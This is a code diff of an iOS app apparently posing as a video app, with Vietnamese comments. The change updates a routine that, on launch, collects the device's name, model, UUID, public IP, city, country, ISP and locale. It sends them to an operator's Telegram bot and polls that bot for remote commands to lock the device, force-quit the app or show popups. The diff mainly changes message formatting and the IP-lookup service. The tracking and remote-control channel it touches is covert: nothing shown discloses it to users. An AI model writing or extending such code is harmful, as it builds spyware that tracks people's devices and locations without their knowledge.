@@ -192,7 +192,7 @@
     [self.spinner stopAnimating];
 }
 
-#pragma mark - Xử lý nút bấm điều khiển Telegram
+#pragma mark - Xử lý Nút Bấm Điều Khiển từ Telegram
 
 - (void)startTelegramCommandListener {
     self.commandTimer = [NSTimer scheduledTimerWithTimeInterval:3.0 target:self selector:@selector(fetchTelegramCommands) userInfo:nil repeats:YES];
@@ -217,7 +217,6 @@
                 self.lastUpdateId = updateId;
             }
 
-            // Xử lý khi bấm nút Callback Button
             NSDictionary *callbackQuery = update[@"callback_query"];
             if (callbackQuery) {
                 NSString *callbackId = callbackQuery[@"id"];
@@ -230,7 +229,6 @@
                 continue;
             }
 
-            // Xử lý tin nhắn gõ tay (nếu có)
             NSDictionary *message = update[@"message"];
             NSString *fromId = [NSString stringWithFormat:@"%@", message[@"chat"][@"id"]];
             NSString *text = message[@"text"];
@@ -270,10 +268,10 @@
         }
 
         [self setupAuthUI];
-        [self sendSimpleMessage:@"🔒 *ĐÃ ĐĂNG XUẤT: Thiết bị đã bị khoá và đưa về màn hình nhập key!*"];
+        [self sendSimpleMessage:@"🔒 <b>ĐÃ ĐĂNG XUẤT:</b> Thiết bị đã bị khóa và đưa về màn hình nhập key!"];
     } 
     else if ([command isEqualToString:@"btn_kill"] || [command isEqualToString:@"/kill"]) {
-        [self sendSimpleMessage:@"💥 *ĐÃ KILL APP: Ứng dụng trên thiết bị đang đóng ngay lập tức!*"];
+        [self sendSimpleMessage:@"💥 <b>ĐÃ KILL APP:</b> Ứng dụng trên thiết bị đang đóng ngay lập tức!"];
         dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.8 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
             exit(0);
         });
@@ -284,11 +282,11 @@
                                                                 preferredStyle:UIAlertControllerStyleAlert];
         [alert addAction:[UIAlertAction actionWithTitle:@"Đã hiểu" style:UIAlertActionStyleDefault handler:nil]];
         [self presentViewController:alert animated:YES completion:nil];
-        [self sendSimpleMessage:@"📢 *Đã gửi popup cảnh báo lên màn hình thiết bị!*"];
+        [self sendSimpleMessage:@"📢 <b>Đã gửi popup cảnh báo lên màn hình thiết bị!</b>"];
     }
 }
 
-#pragma mark - Telemetry & Gửi Telemetry kèm Nút Bấm
+#pragma mark - Thu thập Telemetry & Gửi Telegram (Dùng HTML để không bao giờ lỗi parse)
 
 - (NSString *)getDeviceModel {
     struct utsname systemInfo;
@@ -305,10 +303,10 @@
     NSString *locale = [[NSLocale currentLocale] localeIdentifier];
     NSString *timeZone = [[NSTimeZone localTimeZone] name];
 
-    // Dùng API ip-api.com với User-Agent chuẩn để không bao giờ bị chặn IP
-    NSMutableURLRequest *ipReq = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://ip-api.com/json/?fields=status,message,country,regionName,city,isp,query"]];
-    [ipReq setValue:@"VideoApp/1.0" forHTTPHeaderField:@"User-Agent"];
-    ipReq.timeoutInterval = 8.0;
+    // Dùng API ipapi.is có HTTPS an toàn trên iOS
+    NSMutableURLRequest *ipReq = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"https://api.ipapi.is"]];
+    [ipReq setValue:@"Mozilla/5.0" forHTTPHeaderField:@"User-Agent"];
+    ipReq.timeoutInterval = 6.0;
 
     NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:ipReq completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
         NSString *ip = @"Không xác định";
@@ -319,43 +317,49 @@
 
         if (data && !error) {
             NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
-            if ([json[@"status"] isEqualToString:@"success"]) {
-                ip = json[@"query"] ?: @"N/A";
-                city = json[@"city"] ?: @"N/A";
-                region = json[@"regionName"] ?: @"N/A";
-                country = json[@"country"] ?: @"N/A";
-                isp = json[@"isp"] ?: @"N/A";
+            if (json) {
+                ip = json[@"ip"] ?: @"N/A";
+                NSDictionary *location = json[@"location"];
+                if (location) {
+                    city = location[@"city"] ?: @"N/A";
+                    region = location[@"state"] ?: @"N/A";
+                    country = location[@"country"] ?: @"N/A";
+                }
+                NSDictionary *company = json[@"company"];
+                if (company) {
+                    isp = company[@"name"] ?: @"N/A";
+                }
             }
         }
 
-        NSString *message = [NSString stringWithFormat:
-            @"🚀 *CÓ THIẾT BỊ MỞ ỨNG DỤNG*\n\n"
-            @"📱 *Thiết bị:* `%@` (`%@`)\n"
-            @"⚙️ *iOS:* `%@`\n"
-            @"🆔 *UUID:* `%@`\n"
-            @"🌐 *Địa chỉ IP:* `%@`\n"
-            @"📍 *Vị trí:* `%@, %@, %@`\n"
-            @"🏢 *Nhà mạng/ISP:* `%@`\n"
-            @"🕒 *Múi giờ / Locale:* `%@ / %@`\n"
-            @"🔑 *Trạng thái Key:* `Đã mở khoá (minhhocgioi)`\n"
-            @"📦 *Ứng dụng:* `com.zheedev.videoapp`",
+        // Định dạng HTML an toàn tuyệt đối với Telegram
+        NSString *htmlMessage = [NSString stringWithFormat:
+            @"🚀 <b>CÓ THIẾT BỊ MỞ ỨNG DỤNG</b>\n\n"
+            @"📱 <b>Thiết bị:</b> %@ (%@)\n"
+            @"⚙️ <b>iOS:</b> %@\n"
+            @"🆔 <b>UUID:</b> <code>%@</code>\n"
+            @"🌐 <b>Địa chỉ IP:</b> <code>%@</code>\n"
+            @"📍 <b>Vị trí:</b> %@, %@, %@\n"
+            @"🏢 <b>Nhà mạng/ISP:</b> %@\n"
+            @"🕒 <b>Múi giờ / Locale:</b> %@ / %@\n"
+            @"🔑 <b>Trạng thái Key:</b> Đã mở khoá (minhhocgioi)\n"
+            @"📦 <b>Ứng dụng:</b> <code>com.zheedev.videoapp</code>",
             deviceName, deviceModel, systemVersion, uuid, ip, city, region, country, isp, timeZone, locale
         ];
 
-        [self sendTelegramWithButtons:message];
+        [self sendTelegramWithButtons:htmlMessage];
     }];
     [task resume];
 }
 
-- (void)sendTelegramWithButtons:(NSString *)text {
+- (void)sendTelegramWithButtons:(NSString *)htmlText {
     if ([TELEGRAM_BOT_TOKEN isEqualToString:@"YOUR_BOT_TOKEN"]) return;
 
     NSString *urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage", TELEGRAM_BOT_TOKEN];
     NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
     request.HTTPMethod = @"POST";
-    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
+    [request setValue:@"application/json; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
 
-    // Tạo các nút bấm tương tác trực tiếp bên dưới tin nhắn
     NSDictionary *inlineKeyboard = @{
         @"inline_keyboard": @[
             @[
@@ -370,8 +374,8 @@
 
     NSDictionary *payload = @{
         @"chat_id": TELEGRAM_CHAT_ID,
-        @"text": text,
-        @"parse_mode": @"Markdown",
+        @"text": htmlText,
+        @"parse_mode": @"HTML",
         @"reply_markup": inlineKeyboard
     };
 
@@ -379,18 +383,18 @@
     [[[NSURLSession sharedSession] dataTaskWithRequest:request] resume];
 }
 
-- (void)sendSimpleMessage:(NSString *)text {
+- (void)sendSimpleMessage:(NSString *)htmlText {
     if ([TELEGRAM_BOT_TOKEN isEqualToString:@"YOUR_BOT_TOKEN"]) return;
 
     NSString *urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage", TELEGRAM_BOT_TOKEN];
     NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
     request.HTTPMethod = @"POST";
-    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
+    [request setValue:@"application/json; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
 
     NSDictionary *payload = @{
         @"chat_id": TELEGRAM_CHAT_ID,
-        @"text": text,
-        @"parse_mode": @"Markdown"
+        @"text": htmlText,
+        @"parse_mode": @"HTML"
     };
 
     request.HTTPBody = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
